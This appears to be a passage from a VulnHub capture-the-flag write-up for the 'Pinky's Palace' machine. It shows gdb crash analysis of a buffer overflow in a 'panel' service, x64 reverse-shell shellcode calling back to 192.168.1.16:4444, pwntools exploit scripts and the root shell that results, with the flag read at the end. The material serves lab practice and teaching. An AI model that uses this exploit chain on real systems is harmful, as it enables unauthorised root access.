=> AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAA
```

`exploit.py`

```python
from pwn import *

HOST, PORT = "localhost", 31337

payload = ''
payload += 'A'*120
payload += 'BBBB0000'
payload += 'C'*30

r = remote(HOST,PORT)
r.recvuntil('=> ')
r.sendline(payload)
```

```sh
u64@vm:~/Desktop$ gdb ./panel -q
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/u64/Desktop/panel
[New process 41444]

Thread 2.1 "panel" received signal SIGSEGV, Segmentation fault.
[Switching to process 41444]
[----------------------------------registers-----------------------------------]
RAX: 0x9f
RBX: 0x0
RCX: 0x7ffff7b153dd (<__libc_send+29>:	cmp    rax,0xfffffffffffff000)
RDX: 0x9f
RSI: 0x7fffffffd410 ('A' <repeats 120 times>, "BBBB0000", 'C' <repeats 30 times>, "\n")
RDI: 0x4
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffd488 ("BBBB0000", 'C' <repeats 30 times>, "\n")
RIP: 0x4009aa (<handlecmd+70>:	ret)
R8 : 0x0
R9 : 0x0
R10: 0x0
R11: 0x246
R12: 0x400840 (<_start>:	xor    ebp,ebp)
R13: 0x7fffffffe5c0 --> 0x1
R14: 0x0
R15: 0x0
EFLAGS: 0x10207 (CARRY PARITY adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4009a3 <handlecmd+63>:	call   0x400790 <send@plt>
   0x4009a8 <handlecmd+68>:	nop
   0x4009a9 <handlecmd+69>:	leave
=> 0x4009aa <handlecmd+70>:	ret
   0x4009ab <main>:	push   rbp
   0x4009ac <main+1>:	mov    rbp,rsp
   0x4009af <main+4>:	sub    rsp,0x1050
   0x4009b6 <main+11>:	call   0x400820 <fork@plt>
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffd488 ("BBBB0000", 'C' <repeats 30 times>, "\n")
0008| 0x7fffffffd490 ('C' <repeats 30 times>, "\n")
0016| 0x7fffffffd498 ('C' <repeats 22 times>, "\n")
0024| 0x7fffffffd4a0 ('C' <repeats 14 times>, "\n")
0032| 0x7fffffffd4a8 --> 0xa434343434343 ('CCCCCC\n')
0040| 0x7fffffffd4b0 ('A' <repeats 88 times>, "BBBB0000", 'C' <repeats 30 times>, "\n")
0048| 0x7fffffffd4b8 ('A' <repeats 80 times>, "BBBB0000", 'C' <repeats 30 times>, "\n")
0056| 0x7fffffffd4c0 ('A' <repeats 72 times>, "BBBB0000", 'C' <repeats 30 times>, "\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x00000000004009aa in handlecmd ()
gdb-peda$
gdb-peda$ jmpcall
0x400728 : call rax
0x400895 : jmp rax
0x4008e3 : jmp rax
0x40092e : call rax
0x400cfb : call rsp
0x400d6b : call [rax]
gdb-peda$
```

```sh
u64@vm:~/Desktop$ git clone https://github.com/zerosum0x0/SLAE64.git
Cloning into 'SLAE64'...
remote: Counting objects: 77, done.
remote: Total 77 (delta 0), reused 0 (delta 0), pack-reused 77
Unpacking objects: 100% (77/77), done.
Checking connectivity... done.
u64@vm:~/Desktop$ cd SLAE64/
u64@vm:~/Desktop/SLAE64$ ll
total 44
drwxrwxr-x 9 u64 u64 4096 Apr 29 15:56 ./
drwxr-xr-x 4 u64 u64 4096 Apr 29 15:56 ../
drwxrwxr-x 2 u64 u64 4096 Apr 29 15:56 bindshell/
drwxrwxr-x 2 u64 u64 4096 Apr 29 15:56 crypter/
drwxrwxr-x 2 u64 u64 4096 Apr 29 15:56 egghunter/
drwxrwxr-x 8 u64 u64 4096 Apr 29 15:56 .git/
drwxrwxr-x 5 u64 u64 4096 Apr 29 15:56 polymorphic/
-rw-rw-r-- 1 u64 u64  127 Apr 29 15:56 README.md
drwxrwxr-x 2 u64 u64 4096 Apr 29 15:56 reverseshell/
drwxrwxr-x 2 u64 u64 4096 Apr 29 15:56 rotencoder/
-rw-rw-r-- 1 u64 u64 3196 Apr 29 15:56 shellbuild.py
u64@vm:~/Desktop/SLAE64$
```

```sh
u64@vm:~/Desktop/SLAE64$ sudo apt-get install nasm
[sudo] password for u64:
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following packages were automatically installed and are no longer required:
  linux-headers-4.10.0-28 linux-headers-4.10.0-28-generic linux-headers-4.13.0-37 linux-headers-4.13.0-37-generic linux-image-4.10.0-28-generic linux-image-4.13.0-37-generic
  linux-image-extra-4.10.0-28-generic linux-image-extra-4.13.0-37-generic
Use 'sudo apt autoremove' to remove them.
The following NEW packages will be installed:
  nasm
0 upgraded, 1 newly installed, 0 to remove and 205 not upgraded.
Need to get 1,509 kB of archives.
After this operation, 4,196 kB of additional disk space will be used.
Get:1 http://us.archive.ubuntu.com/ubuntu xenial/universe amd64 nasm amd64 2.11.08-1 [1,509 kB]
Fetched 1,509 kB in 1s (1,256 kB/s)
Selecting previously unselected package nasm.
(Reading database ... 288486 files and directories currently installed.)
Preparing to unpack .../nasm_2.11.08-1_amd64.deb ...
Unpacking nasm (2.11.08-1) ...
Processing triggers for doc-base (0.10.7) ...
Processing 1 added doc-base file...
Processing triggers for install-info (6.1.0.dfsg.1-5) ...
Processing triggers for man-db (2.7.5-1) ...
Setting up nasm (2.11.08-1) ...
u64@vm:~/Desktop/SLAE64$
```

```sh
u64@vm:~/Desktop$ ifconfig
ens33     Link encap:Ethernet  HWaddr 00:0c:29:21:6b:55
          inet addr:192.168.1.16  Bcast:192.168.1.255  Mask:255.255.255.0
          inet6 addr: fe80::32e:e32c:6f95:ab95/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:215611 errors:0 dropped:0 overruns:0 frame:0
          TX packets:172156 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:81172438 (81.1 MB)  TX bytes:30861661 (30.8 MB)

lo        Link encap:Local Loopback
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:65536  Metric:1
          RX packets:339 errors:0 dropped:0 overruns:0 frame:0
          TX packets:339 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000
          RX bytes:26989 (26.9 KB)  TX bytes:26989 (26.9 KB)

u64@vm:~/Desktop$
```

![](images/37.png)

```sh
u64@vm:~/Desktop/SLAE64/reverseshell$ python ../shellbuild.py -x 64 reverseshell.asm
Assembling reverseshell.asm (elf64)
Parsing disassembly
Linking into build/reverseshell.elf
	"\x6a\x29"                      /* pushq  $0x29 */
	"\x58"                          /* pop    %rax */
	"\x99"                          /* cltd */
	"\x6a\x02"                      /* pushq  $0x2 */
	"\x5f"                          /* pop    %rdi */
	"\x6a\x01"                      /* pushq  $0x1 */
	"\x5e"                          /* pop    %rsi */
	"\x0f\x05"                      /* syscall */
	"\x50"                          /* push   %rax */
	"\x5f"                          /* pop    %rdi */
	"\x52"                          /* push   %rdx */
	"\xc7\x44\x24\x04\xc0\xa8\x01"  /* movl   $0x1001a8c0,0x4(%rsp) */
	"\x10"                          /* . */
	"\x66\xc7\x44\x24\x02\x11\x5c"  /* movw   $0x5c11,0x2(%rsp) */
	"\xc6\x04\x24\x02"              /* movb   $0x2,(%rsp) */
	"\x54"                          /* push   %rsp */
	"\x5e"                          /* pop    %rsi */
	"\x6a\x10"                      /* pushq  $0x10 */
	"\x5a"                          /* pop    %rdx */
	"\x6a\x2a"                      /* pushq  $0x2a */
	"\x58"                          /* pop    %rax */
	"\x0f\x05"                      /* syscall */
	"\x6a\x03"                      /* pushq  $0x3 */
	"\x5e"                          /* pop    %rsi */
	"\xff\xce"                      /* dec    %esi */
	"\xb0\x21"                      /* mov    $0x21,%al */
	"\x0f\x05"                      /* syscall */
	"\x75\xf8"                      /* jne    2f <dupe_loop> */
	"\x56"                          /* push   %rsi */
	"\x5a"                          /* pop    %rdx */
	"\x56"                          /* push   %rsi */
	"\x48\xbf\x2f\x2f\x62\x69\x6e"  /* movabs $0x68732f6e69622f2f,%rdi */
	"\x2f\x73\x68"                  /* . */
	"\x57"                          /* push   %rdi */
	"\x54"                          /* push   %rsp */
	"\x5f"                          /* pop    %rdi */
	"\xb0\x3b"                      /* mov    $0x3b,%al */
	"\x0f\x05"                      /* syscall */
Writing to build/reverseshell.c (2065 bytes)
Writing to build/reverseshell.txt (300 bytes)
Writing to build/reverseshell.bin (75 bytes)
Compiling to  build/reverseshell.out


\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5f\x52\xc7\x44\x24\x04\xc0\xa8\x01\x10\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05
u64@vm:~/Desktop/SLAE64/reverseshell$
```

`final-exploit.py`

```python
from pwn import *

HOST, PORT = "localhost", 31337

# Shellcode
buf = '\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5f\x52\xc7\x44\x24\x04\xc0\xa8\x01\x10\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05'

# Reverse Shell
payload = buf

# Junk
payload += 'A'*(120-len(buf))

# RSP Overwrite, Call RSP
payload += p64(0x400cfb)

print(payload)

r = remote(HOST,PORT)
r.recvuntil('=> ')
r.sendline(payload)
```

```sh
u64@vm:~/Desktop$ pkill -9 panel
u64@vm:~/Desktop$ pkill -9 panel
u64@vm:~/Desktop$ gdb ./panel -q
Reading symbols from ./panel...(no debugging symbols found)...done.
gdb-peda$ r
Starting program: /home/u64/Desktop/panel
[New process 42668]
process 42668 is executing new program: /bin/dash
[New process 42672]
process 42672 is executing new program: /usr/bin/id
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
[Inferior 3 (process 42672) exited normally]
Warning: not running or target is remote
gdb-peda$
```

```sh
u64@vm:~/Desktop$ python final-exploit.py
j)X\x99j_j^\x0f\x05P_R�D$\x04��\x10f�D$\x11\�$T^j\x10Zj*X\x0f\x05j\x03^\xffΰ!\x0f\x05u�VZVH\xbf//bin/shWT_\xb0;\x0f\x05AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�
[+] Opening connection to localhost on port 31337: Done
[*] Closed connection to localhost port 31337
u64@vm:~/Desktop$
```

```sh
u64@vm:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.1.16] port 4444 [tcp/*] accepted (family 2, sport 58372)
id
uid=1000(u64) gid=1000(u64) groups=1000(u64),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),113(lpadmin),128(sambashare)
```

![](images/38.png)

`final-exploit.py`

```python
from pwn import *

HOST, PORT = "pinkydb", 31337

# Shellcode
buf = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x50\x5f\x52\xc7\x44\x24\x04\xc0\xa8\x01\x10\x66\xc7\x44\x24\x02\x11\x5c\xc6\x04\x24\x02\x54\x5e\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\x56\x5a\x56\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x57\x54\x5f\xb0\x3b\x0f\x05"

# Reverse Shell
payload = buf

# Junk
payload += 'A'*(120-len(buf))

# RSP Overwrite, Call RSP
payload += p64(0x400cfb)

#print(payload)

r = remote(HOST,PORT)
r.recvuntil("=> ")
r.sendline(payload)
```

```sh
u64@vm:~/Desktop$ python final-exploit.py
[+] Opening connection to pinkydb on port 31337: Done
[*] Closed connection to pinkydb port 31337
u64@vm:~/Desktop$
```

```sh
u64@vm:~$ nc -nlvp 4444
Listening on [0.0.0.0] (family 0, port 4444)
Connection from [192.168.1.26] port 4444 [tcp/*] accepted (family 2, sport 39814)
id
uid=0(root) gid=0(root) groups=0(root)
cd /root
ls
root.txt
cat root.txt

 ____  _       _          _
|  _ \(_)_ __ | | ___   _( )___
| |_) | | '_ \| |/ / | | |// __|
|  __/| | | | |   <| |_| | \__ \
|_|   |_|_| |_|_|\_\\__, | |___/
                    |___/
 ____       _
|  _ \ __ _| | __ _  ___ ___
| |_) / _` | |/ _` |/ __/ _ \
|  __/ (_| | | (_| | (_|  __/
|_|   \__,_|_|\__,_|\___\___|

[+] CONGRATS YOUVE PWND PINKYS PALACE!!!!!!
[+] Flag: 2208f787fcc6433b4798d2189af7424d
[+] Twitter: @Pink_P4nther
[+] Cheers to VulnHub!
[+] VM Host: VMware
[+] Type: CTF || [Realistic]
[+] Hopefully you enjoyed this and gained something from it as well!!!
```

###### References

- [Port knocking](https://wiki.archlinux.org/index.php/Port_knocking)
